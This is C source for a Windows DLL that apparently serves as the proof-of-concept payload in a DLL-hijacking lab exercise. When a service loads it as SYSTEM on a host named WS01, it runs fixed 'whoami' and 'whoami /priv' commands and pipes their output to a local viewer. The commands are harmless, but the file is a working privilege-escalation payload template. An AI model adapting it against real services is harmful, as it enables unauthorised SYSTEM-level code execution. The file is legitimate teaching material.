/* NORTH Topic 12: fixed-command, read-only SYSTEM execution demonstration.
 * Invoked only by KingdomDllSvc through the KingdomDllProof export.
 * No arbitrary commands, user-controlled input, shell, persistence, or network.
 * Output of two hardcoded whoami commands is streamed to Rickon's local pipe.
 */
typedef void *HANDLE;
typedef void *HLOCAL;
typedef void *LPVOID;
typedef unsigned long DWORD;
typedef unsigned short WCHAR;
typedef unsigned char BYTE;
typedef int BOOL;
typedef const WCHAR *LPCWSTR;
typedef WCHAR *LPWSTR;
typedef struct { DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle; } SECURITY_ATTRIBUTES;
typedef struct { LPVOID Sid; DWORD Attributes; } SID_AND_ATTRIBUTES;
typedef struct { SID_AND_ATTRIBUTES User; } TOKEN_USER;
typedef struct {
    DWORD cb; LPWSTR lpReserved; LPWSTR lpDesktop; LPWSTR lpTitle;
    DWORD dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
    DWORD dwFillAttribute, dwFlags; unsigned short wShowWindow, cbReserved2;
    BYTE *lpReserved2; HANDLE hStdInput, hStdOutput, hStdError;
} STARTUPINFOW;
typedef struct { HANDLE hProcess, hThread; DWORD dwProcessId, dwThreadId; } PROCESS_INFORMATION;
#define DLL __declspec(dllimport)
DLL BOOL __stdcall GetComputerNameW(LPWSTR, DWORD *);
DLL int __stdcall lstrcmpiW(LPCWSTR, LPCWSTR);
DLL HANDLE __stdcall GetCurrentProcess(void);
DLL BOOL __stdcall CloseHandle(HANDLE);
DLL HLOCAL __stdcall LocalFree(HLOCAL);
DLL BOOL __stdcall OpenProcessToken(HANDLE, DWORD, HANDLE *);
DLL BOOL __stdcall GetTokenInformation(HANDLE, int, LPVOID, DWORD, DWORD *);
DLL BOOL __stdcall ConvertSidToStringSidW(LPVOID, LPWSTR *);
DLL HANDLE __stdcall CreateFileW(LPCWSTR, DWORD, DWORD, SECURITY_ATTRIBUTES *, DWORD, DWORD, HANDLE);
DLL BOOL __stdcall CreatePipe(HANDLE *, HANDLE *, SECURITY_ATTRIBUTES *, DWORD);
DLL BOOL __stdcall SetHandleInformation(HANDLE, DWORD, DWORD);
DLL BOOL __stdcall CreateProcessW(LPCWSTR, LPWSTR, LPVOID, LPVOID, BOOL, DWORD, LPVOID, LPCWSTR, STARTUPINFOW *, PROCESS_INFORMATION *);
DLL BOOL __stdcall ReadFile(HANDLE, LPVOID, DWORD, DWORD *, LPVOID);
DLL BOOL __stdcall WriteFile(HANDLE, const void *, DWORD, DWORD *, LPVOID);
DLL DWORD __stdcall WaitForSingleObject(HANDLE, DWORD);
DLL BOOL __stdcall GetExitCodeProcess(HANDLE, DWORD *);
DLL BOOL __stdcall FlushFileBuffers(HANDLE);
#define TOKEN_QUERY 0x0008u
#define GENERIC_WRITE 0x40000000u
#define GENERIC_READ 0x80000000u
#define FILE_SHARE_READ 0x00000001u
#define FILE_SHARE_WRITE 0x00000002u
#define OPEN_EXISTING 3u
#define FILE_ATTRIBUTE_NORMAL 0x00000080u
#define HANDLE_FLAG_INHERIT 1u
#define STARTF_USESTDHANDLES 0x00000100u
#define CREATE_NO_WINDOW 0x08000000u
#define INVALID_HANDLE_VALUE ((HANDLE)(-1))

static int system_context(void)
{
    HANDLE token = (HANDLE)0;
    BYTE buffer[512];
    DWORD size = 0;
    LPWSTR sid = (LPWSTR)0;
    int valid = 0;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return 0;
    if (GetTokenInformation(token, 1, buffer, sizeof(buffer), &size) &&
        ConvertSidToStringSidW(((TOKEN_USER *)buffer)->User.Sid, &sid)) {
        valid = (lstrcmpiW(sid, L"S-1-5-18") == 0);
        LocalFree((HLOCAL)sid);
    }
    CloseHandle(token);
    return valid;
}
static int send_text(HANDLE output, const char *value)
{
    DWORD written = 0, length = 0;
    while (value[length]) length++;
    return WriteFile(output, value, length, &written, (LPVOID)0) && written == length;
}
static int fixed_whoami(HANDLE destination, const WCHAR *args, const char *label)
{
    HANDLE read_end = (HANDLE)0, write_end = (HANDLE)0, input = INVALID_HANDLE_VALUE;
    SECURITY_ATTRIBUTES sa = {0};
    STARTUPINFOW startup = {0};
    PROCESS_INFORMATION child = {0};
    WCHAR command[96] = L"\"C:\\Windows\\System32\\whoami.exe\" ";
    DWORD n = 0, got = 0, exit_code = 1;
    char buffer[1024];
    int ok = 0;
    /* Only two statically defined whoami arguments are ever accepted. */
    if (lstrcmpiW(args, L"") != 0 && lstrcmpiW(args, L"/priv") != 0) return 0;
    for (n = 0; command[n] != 0; n++) { }
    for (DWORD i = 0; args[i] != 0 && n + 1 < 96; i++) command[n++] = args[i];
    command[n] = 0;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = 1;
    if (!CreatePipe(&read_end, &write_end, &sa, 0)) return 0;
    if (!SetHandleInformation(read_end, HANDLE_FLAG_INHERIT, 0)) goto cleanup;
    input = CreateFileW(L"NUL", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        &sa, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)0);
    if (input == INVALID_HANDLE_VALUE) goto cleanup;
    startup.cb = sizeof(startup);
    startup.dwFlags = STARTF_USESTDHANDLES;
    startup.hStdInput = input;
    startup.hStdOutput = write_end;
    startup.hStdError = write_end;
    if (!send_text(destination, label)) goto cleanup;
    if (!CreateProcessW(L"C:\\Windows\\System32\\whoami.exe", command,
                        (LPVOID)0, (LPVOID)0, 1, CREATE_NO_WINDOW, (LPVOID)0,
                        L"C:\\Windows\\System32", &startup, &child)) goto cleanup;
    CloseHandle(write_end);
    write_end = (HANDLE)0;
    while (ReadFile(read_end, buffer, sizeof(buffer), &got, (LPVOID)0) && got) {
        DWORD sent = 0;
        if (!WriteFile(destination, buffer, got, &sent, (LPVOID)0) || sent != got) goto cleanup;
    }
    if (WaitForSingleObject(child.hProcess, 3000) != 0) goto cleanup;
    if (!GetExitCodeProcess(child.hProcess, &exit_code) || exit_code != 0) goto cleanup;
    ok = send_text(destination, "\r\n");
cleanup:
    if (child.hThread) CloseHandle(child.hThread);
    if (child.hProcess) CloseHandle(child.hProcess);
    if (input != INVALID_HANDLE_VALUE) CloseHandle(input);
    if (write_end) CloseHandle(write_end);
    if (read_end) CloseHandle(read_end);
    return ok;
}
__declspec(dllexport) int __cdecl KingdomDllProof(void)
{
    WCHAR host[64] = {0};
    DWORD size = 64;
    HANDLE destination;
    int success = 0;
    if (!GetComputerNameW(host, &size) || lstrcmpiW(host, L"WS01") != 0)
        return 0;
    if (!system_context()) return 0;
    /* The reader is a PowerShell viewer in Rickon's RDP window.
       No data is written to disk and there is no command input. */
    destination = CreateFileW(L"\\\\.\\pipe\\KingdomsTopic12Proof", GENERIC_WRITE, 0,
                              (SECURITY_ATTRIBUTES *)0, OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL, (HANDLE)0);
    if (destination == INVALID_HANDLE_VALUE) return 0;
    if (send_text(destination, "=== NORTH Topic 12: DLL Hijacking ===\r\n") &&
        send_text(destination, "System service executed these fixed Windows commands:\r\n\r\n") &&
        fixed_whoami(destination, L"", "C:\\Windows\\System32> whoami\r\n") &&
        fixed_whoami(destination, L"/priv", "C:\\Windows\\System32> whoami /priv\r\n")) {
        success = send_text(destination, "=== End of SYSTEM command proof ===\r\n");
    }
    FlushFileBuffers(destination);
    CloseHandle(destination);
    return success ? 0x4B120012 : 0;
}
/* Freestanding PE build: support compiler-generated structure copies. */
void *memcpy(void *destination, const void *source, unsigned long long count)
{
    BYTE *to = (BYTE *)destination;
    const BYTE *from = (const BYTE *)source;
    unsigned long long i;
    for (i = 0; i < count; i++) to[i] = from[i];
    return destination;
}
